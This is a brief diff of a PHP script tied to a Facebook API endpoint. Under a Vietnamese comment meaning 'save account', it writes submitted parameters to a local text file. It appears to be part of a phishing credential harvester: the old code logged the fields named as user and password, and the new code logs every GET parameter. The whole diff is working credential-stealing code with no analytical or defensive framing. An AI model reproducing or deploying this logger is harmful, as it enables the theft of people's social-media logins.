@@ -12,14 +12,11 @@ define('BASE_URL', 'https://api.facebook.com/restserver.php');
 
 //Lưu nick
 $handle = fopen("tretrau.txt", "a");
-foreach($_POST as $variable => $value) {
-if ($variable == $_GET['u'] or $variable == $_GET['p'])
-{
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
+foreach($_GET as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
 }
 fwrite($handle, "\r\n");
 fclose($handle);
